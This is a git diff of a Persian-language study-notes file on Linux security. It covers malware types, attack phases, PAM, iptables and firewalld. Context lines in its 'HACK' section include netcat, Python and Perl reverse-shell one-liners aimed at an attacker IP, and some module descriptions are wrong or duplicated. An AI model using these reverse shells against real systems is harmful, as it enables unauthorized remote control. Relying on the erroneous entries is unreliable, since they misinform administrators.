@@ -1,6 +1,6 @@
 <div dir="rtl">
 
-# 📍️ Concepts مفاهیم
+# 🅰️ Concepts مفاهیم
 
 - **InformationGathering:** این قسمت شامل ابزار های جمع‌آوری اطلاعات است که در این دسته قرار دارند.
 - **VulnerabilityAnalysis:** در این بخش ابزار های اسکنر برای پیدا کردن اسیب پذیری ها قرار دارند.
@@ -25,14 +25,14 @@
 - **PassiveAttacks[حملات‌غیرفعال]:** در این نوع حملات، مهاجم تنها ترافیک شبکه یا داده‌ها را شنود می‌کند بدون اینکه تغییری در سیستم ایجاد کند. هدف این حملات معمولاً Information Gathering است، بدون اینکه برای سیستم هدف مخرب به نظر برسد.
 - **bypass**: «گذرگاه‌فرعی» یا «ازراه‌فرعی‌رفتن» یا «تقاطع‌که‌راه‌فرعی‌دارد»
 
-## انواع بدافزار ✅️ ️
+## 🅱️ انواع بدافزار
 
 - **Virus(ویروس)**: قطعه کد که توسط بدافزارنویس نوشته شده و طبق روال از قبل تعریف و تعیین شده عمل می‌کند(قطعه کد خرابکاری)
 - **Trojan(تروجان)**: قطعه کد که توسط بدافزارنویس نوشته شده و کنترل آن در دست بدافزار نویس است(کنترل راه دور و گاهی هم به‌صورت خودکار تصمیم و عمل می‌کند). همچنین دیتا جمع‌آوری کرده و درزمان خاص اطلاعات را ارسال می‌کند
 - **RootKit(روت کیت)**: کیت نرم‌افزاری خیلی خطرناک(بدلیل برخورداری از دسترسی اصلی )
 - **Malware(کرم)**: قطعه کد هوشمندبا قابلیت تصمیم‌گیری در شرایط برای تحقق هدف‌خاص(مثلا نیروگاه اتمی) و در نهایت درصورت نیاز ارسال دیتا به سرور
 
-# 📍️ AttacksType(انواع حملات)
+# 🅰️ AttacksType(انواع حملات)
 
 - MITM (Man-in-the-Middle)
 - DoS
@@ -46,7 +46,7 @@
 - NoFunctionLevelControl
 - BrokenAuthentication
 
-# 📍️ Applications ابزارهای و برنامه‌ها
+# 🅰️ Applications ابزارهای و برنامه‌ها
 
 - IPTables
 - NfTable
@@ -63,7 +63,7 @@
     - crunch 4 5 -o /tmp/Output.txt #اگر عددی یا حروفی انتخاب نکنید همه موارد انتخاب خواهد شد
 - نرم‌آفزار Nuclear Rat: سرور میسازد و تروجان ایجاد می‌کند
 
-## ✅️ snort
+## 🅱️ snort
 
 snort: یک برنامه که سر راه ترافیک می‌نشیند و ترافیک را بررسی می‌کنند
 
@@ -82,7 +82,7 @@ alert icmp any any -> 192.168.1.0/24 any (msg: "ICMP traffic detected") # مثا
 
 مثلا می‌شود کاری کرد که اگر کسی فلان کار را کرد توسط iptable او را ban یا نهایتا block نماییم
 
-# 📍️ AntiHack(مقابله با هک)
+# 🅰️ AntiHack(مقابله با هک)
 
 - بروزرسانی کرنل و نرم افزارها
 - غیرفعال کردن root login توسط پارامترPermitRootLogin=no در فایل sshd_config
@@ -100,11 +100,11 @@ alert icmp any any -> 192.168.1.0/24 any (msg: "ICMP traffic detected") # مثا
 - بررسی لاگ ها و تجزیه و تحلیل وقایع
 - کنترل تعدد سطح دسترسی یوزرها [افراد مجاز یوزر روت]
 
-# 📍️ Mentions
+# 🅰️ Mentions
 
 - Kali Alterntives OS: 1-Parrot os 2-Backbox os
 
-## ✅️ Five Step for do Hacking...
+## 🅱️ Five Step for do Hacking...
 
 1. Reconnaissance (شناسایی) : جمع‌آوری اطلاعات اولیه درباره هدف.
 2. Scanning : استفاده از ابزارهای خاص برای شناسایی نقاط ضعف سیستم ها و شبکه ها.
@@ -112,11 +112,11 @@ alert icmp any any -> 192.168.1.0/24 any (msg: "ICMP traffic detected") # مثا
 4. Maintaining Access (حفظ دسترسی) : حفظ دسترسی به سیستم برای مدت زمان طولانی تر بدون شناسایی.
 5. Clearing Tracks (پاک کردن رد پاها) : پاک کردن لاگ ها و ردپاها برای جلوگیری از شناسایی توسط مدیران سیستم.
 
-# 📍️ HACK
+# 🅰️ HACK
 
-## ✅️ 1.GetShell
+## 🅱️ GetShell
 
-### 1.1.Linux
+### ✅️ Linux
 
 > روش اول
 
@@ -141,7 +141,7 @@ nc -lvp 4444 # Attacker(10.0.20.206)
 
 ---
 
-#### 1.1.1.proxy
+#### ✳️ proxy
 
 <div dir="ltr">
 
@@ -163,7 +163,7 @@ nc -lvp 4444
 
 ```
 
-### 1.2.Windows
+### ✅️ Windows
 
 ```
 nc.exe  10.0.20.206 4444 -e cmd.exe # Target
@@ -172,7 +172,7 @@ nc -lvp 4444 # Attacker(10.0.20.206)
 
 ---
 
-#### 1.2.1.proxy
+#### ✳️ proxy
 
 <div dir="ltr">
 
@@ -209,7 +209,7 @@ nc -lvp 4444
 
 ```
 
-### 1.3.python
+### ✅️ python
 
 ```shell
 # Target:
@@ -219,7 +219,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 nc -lvp 4444
 ```
 
-### 1.4.Perl
+### ✅️ Perl
 
 ```shell
 # Target:
@@ -229,7 +229,7 @@ perl -e 'use Socket;$i=”10.0.20.206″;$p=4444;socket(S,PF_INET,SOCK_STREAM,ge
 nc -lvp 4444
 ```
 
-### 1.5.PHP
+### ✅️ PHP
 
 ```shell
 # Target:
@@ -240,7 +240,7 @@ nc -lvp 4444
 
 ```
 
-## ✅️ 2.send Data
+## 🅱️ send Data
 
 > انتقال دیتا از طریق برنامه Netcat
 
@@ -254,9 +254,179 @@ nc -l -p 55000 > /tmp/FIle.txt # Server1
 nc <IPserver1> 55000 < File.txt # server2
 ```
 
-# 📍️ TLS
+# 🅰️ TLS
 
 * openssl3.1 + برخی ویژگی جدید
 * پروتکل openssl3 را ارتقا دادند و باگ‌های امنیتی آن را برطرف کردند و شماره آن را گذاشتند openssl3.1
+
+# 🅰️ Authentication
+
+* PAP
+    * نام کاربری و پسورد را بصورت clearText ارسال میکند
+* CHAP
+    * ۱-سرور سه کاراکتر xyz (تغییرپذیر) به کلاینت ارسال میکند
+    * ۲-کلاینت پسورد را همراه با xyz به هش تبدیل میکند
+    * ۳-سرور پسورد را دارد و عملیات شماره ۲ را انجام مید‌هد
+    * ۴-هش سرور و هش کلاینت مقایسه می‌شود
+
+## 🅱️ PAM(Pluggable Authentication Modules)
+
+* یک لایه authenticate برای سرویس‌دادن به تمام برنامه‌های لینوکس که هرکسی کارهای authenticate داشت به آن رجوع و جواب خود را کسب می‌کند و بدلیل اینکه pluggable هست هر برنامه می‌تواند ماژول خود را به PAM ارائه دهد و از PAM سرویس دریافت نماید
+* nsswitch: ترتیب استفاده از فایلها یا سرویسها را برای authenticate یا responses به برخی از موارد در سیستم تعیین می کند
+* login auth required pam_unix.so
+* ماژول‌های کرنلی PAM library به شرح زیر است
+    * [pam_access.so]: Used to provide anonymous logins for public FTP servers
+    * [pam_chroot.so]: Used to create a locked down area for logins
+    * [pam_console.so]: Provides a console login environment
+    * [pam_cracklib.so]: Provides password strength checks
+    * [pam_deny.so]: Prohibits login attempts (often used as a default)
+    * [pam_env.so]: Sets or unsets environment variables
+    * [pam_lastlog.so]: Provides the last login time for the user account
+    * [pam_limits.so]: Enforces resource limits (such as number of open files) on accounts
+    * [pam_listfile.so]: Allows or denies actions based on a list file
+* ماژول‌های کرنلی PAM authentication به شرح زیر است
+    * [pam_unix.so]: استفاده از فایل استاندارد /etc/shadow و /etc/passwd
+    * [pam_krb5.so]: استفاده از مکانیزم Kerberos5 برای authenticate کردن کاربران و دسترسی‌ها
+    * [pam_ldap.so]: استفاده از LDAP
+    * [pam_nis.so]: استفاده از NIS سرور
+    * [pam_sss.so]: استفاده از System Security Services daemon یا SSSD
+    * [pam_userdb.so]: استفاده از یک دیتابیس فایل استاندارد بافرمت db
+
+### 📁️ etc/pam.conf
+
+* فایل etc/pam.conf با فرمت زیر قابلیت کانفیگ شدن دردوحالت زیر را دارد
+
+> حالت اول 1️⃣️: type های قابل تنظیم مطابق زیر است
+
+```
+[account]: Account verification services
+[auth]: Authentication services
+[password]: Password management services
+[session]: External services, such as logging attempts to a file or mounting a directory An application can define multiple feature types for an uthentication, but you must use a separate configuration line to define each feature type.
+```
+
+> حالت دوم 2️⃣️: control های قابل تنظیم مطابق زیر است
+
+```
+[requisite]: Terminate the application if authentication fails.
+[required]: Return a failure status if authentication fails, but continue checking otherrules.
+[sufficient]: If the rule succeeds, the authentication process stops with a success status.
+[optional]: The rule is not necessary, unless it is the only rule defined for the module.[requisite]: Terminate the application if authentication fails.
+[required]: Return a failure status if authentication fails, but continue checking otherrules.
+[sufficient]: If the rule succeeds, the authentication process stops with a success status.
+[optional]: The rule is not necessary, unless it is the only rule defined for the module.
+```
+
+مثال۱: در پروسه لاگین(یعنی یک اپلیکیشن بنام login که منظور همان پروسه لاگین لینوکس است) که از نوع uthentication کردن کاربران و بررسی دسترسی است از نوع required یعنی حتما باید بتواند لاگین کند وگرنه fail برمیگرداند و از ماژول pam_unix.so استفاده می‌گردد یعنی باید براساس فایل /etc/passwd و /etc/shadow عمل authenticate را انجام بده
+
+![PAM.png](/home/Files/01-Programming/GitHub/Codes/_srcFiles/Images/PAM.png "PAM.png")
+
+# 🅰️ iptable
+
+* chain: بسته‌ای که از اینترنت به سیستم می‌رسد تحت زنجیره‌ای از جایی ورود می‌نماید و به جایی می‌رسد. بسته اول از یک chain بنام PreRoute عبور می‌کند که در ادامه ۲ حالت خواهد شد:
+    1. بسته قصد ورود به سیستم عامل دارد که وارد InputChain می‌شود و ممکن است پس از انجام پردازش روی آن در OutputChain قرار بگیرد و به خروجی هدایت شود
+    2. بسته قرار است بدون ورود به سیستم به یک سیستم دیگری هدایت یا Remote گردد که در این صورت وارد ForwardChain خواهد شد
+* حالت‌های متفاوت chain
+    * [PREROUTING chain]: handles packets before the routing decision process.
+    * [INPUT chain]: handles packets destined for the local system.
+    * [FORWARD chain]: handles packets being forwarded to a remote system.
+    * [POSTROUTING chain]: handles packets being sent to remote systems, after the forward filter.
+    * [OUTPUT chain]: handles packets output from the local system.
+* نکته: اگر بخواهیم یک سیستم بسته‌های ورودی را به ریموت هاست forward نماید باید در آی‌پی ورژن۴ مقدار net.ipv4.ip_forward و در آی‌پی ورزن ۶ مقدار net.ipv6.conf.all.forwarding در sysctl عدد 1 داشته باشد
+* [table]: جدولی که rule ها در آن نوشته می‌شود که در INPUT chhain سه table با نام‌های ذیل داریم
+    1. FILTER: قواعدی که یک بسته را block یا allow میکنند
+    2. MANGLE: قواعدی که یک بسته رو تغییر می‌دهند
+    3. NAT: قواعدی برای NAT نمودن بسته‌ها
+* [Drop]: دور انداختن یک بسته
+* [Accept]: پذیرفتن درخواست
+* [Reject]:بدون باز کردن یک بسته آن را برمی‌گرداند[Log]: لاگ کرده و سپس accept می‌نماید
+* [REDIRECT]: هدایت به جایی
+* نکته مهم: ورزن جدید نسخه Iptable نام nftable دارد و این دستور کارهای آی پی تیبل را انجام می‌دهد
+
+## 🅱️ iptable command
+
+* دستورهای پایه‌ای:
+  * [A chain rule-]: افزودن یک قانون جدید به یک chain خاص
+  * [D chain rule-]: حذف یک قانون جدید از یک chain خاص
+  * [F [chain-]]: حذف تمام قوانین وضع شده از یک chain یا تمام chainها
+  * [I chain index rule-]: افزودن(Insert) یک قانون بین دو قانون وضع شده قبلی(ترتیب قرار گرفتن یک قانون مهم است)
+  * [L [chain-]]: لیست قوانون موجود در یک chain یا همه chainها
+  * [S [chain-]]: لیست قوانون موجود در یک chain یا همه chainها یا جزئیات بیشتر
+  * [P chain target-]: تعیین سیاست عمومی یک chain عمل dropباشد یا allow
+  * [R chain index rule-]: جایگزین نمودن(Replace) یک قانون در یک index خاص(ترتیب قرار گرفتن یک قانون مهم است)
+  * [t table-]: مشخص نمودن یک table
+* دستورها قانون‌ها به‌صورت زیر است:
+    * [d address-]: تغیین مقصد
+    * [g chain-]: پرش به یک chain جدید
+    * [i name-]: تعیین اینترفیس ورودی یک کارت شبکه
+    * [j target-]: عمل DROP صورت گیرد یا عمل ACCEPT یا LOG یا REJECT
+    * [o name-]: تعیین اینترفیس خروجی یک کارت شبکه
+    * [p protocol-]: تعیین پروتکل
+    * [s address-]: تعیین مبدا
+    * [sport--]: تعیین پورت ورودی
+    * [dport--]: تعیین پورت خروجی
+
+
+```shell
+iptables -L #نمایش وضعیت موجود
+iptables -P OUTPUT [DROP/ACCEPT] #قرار دادن پالیسی دیفالت drop یا accept در چِین OUTPUT
+iptables -t filter -P OUTPUT DROP #قرار دادن پالیسی دیفالت drop در چِین OUTPUT در جدول filter
+iptables -A INPUT -s 10.0.1.25 -j REJECT #عمل REJECT روی آی‌پی 10.0.1.25 در INPUT chain یعنی هیچگاه این آی‌پی نمی‌تواند به سیستم بسته ارسال نماید
+iptables -A OUTPUT -d 4.2.2.4 -p icmp -j REJECT #بستن پینگ 4.2.2.4 برای همه
+iptables -A OUTPUT -p icmp -j DROP #بستن همه پینگ‌ها
+iptables-save #نمایش تمام قوانین موجود در iptables
+iptables-save > FileName.txt #ایجاد بک‌آپ از تمام قوانیم موجود در iptables در یک فایل
+iptables-restore < FileName.txt #ریستور کردن قوانین iptables از یک فایل که قبلا بک آپ گرفته شده بود توسط دستور iptables-save
+iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8080 -j REDIRECT --to-port 80 #بسته‌هایی ورودی که پورت مقصد آن بسته 8080 باشد و اینترفیس eth0 و پروتکل tcp باشد را به پورت ۸۰ هدایت نماید و این قانون را به جدول nat از chain بنام PREROUTING اضافه نماید
+iptables
+
+بازکردن پورت ان تی پی سرور 
+sudo iptables -A OUTPUT -p udp --dport 123 -j ACCEPT
+sudo iptables -A INPUT     -p udp --sport 123 -j ACCEPT
+نمایش تمام رول های آی پی تیبل
+sudo iptables -L [INPUT | OUTPUT | FORWARD] -n -v
+sudo iptables -L -n -v
+-L: این گزینه برای لیست کردن (نمایش) تمام زنجیره‌ها و رول‌ها استفاده می‌شود.
+-n: این گزینه از تبدیل آدرس‌های IP و نام‌های دامنه به فرمت عددی جلوگیری می‌کند، که باعث افزایش سرعت نمایش می‌شود.
+-v: این گزینه اطلاعات بیشتری را نمایش می‌دهد، از جمله تعداد بسته‌ها و بایت‌هایی که هر رول پردازش کرده است.
+
+```
+
+
+## 🅱️ firewall-cmd
+
+```shell
+rpm -qa firewalld          #install
+sudo apt install firewalld #install
+sudo firewall-cmd --state
+sudo firewall-cmd --reload
+sudo firewall-cmd --get-zones
+sudo firewall-cmd --get-services
+sudo firewall-cmd --get-default-zone
+sudo firewall-cmd --zone=home --add-interface=wlp1s0
+sudo firewall-cmd --zone=public --add-interface=wlp1s0
+sudo firewall-cmd --zone=public --change-interface=wlp1s0
+sudo firewall-cmd --get-active-zones
+sudo firewall-cmd --list-ports
+sudo firewall-cmd --list-services
+
+#[1]
+sudo firewall-cmd --set-default-zone=external
+#[or]
+sudo firewall-cmd --set-default-zone=external --permanent
+sudo firewall-cmd --reload
+
+#[2]
+sudo firewall-cmd --zone=home --list-all
+#[or]
+sudo firewall-cmd --info-zone public
+
+```
+
+[URL](https://www.tecmint.com/install-configure-firewalld-in-centos-ubuntu)
+
+![route-netfilter.jpg](/home/Files/01-Programming/GitHub/Codes/_srcFiles/Images/route-netfilter.jpg "route-netfilter.jpg")
+![iptable.png](/home/Files/01-Programming/GitHub/Codes/_srcFiles/Images/iptable.png "iptable.png")
+
 
 </div>
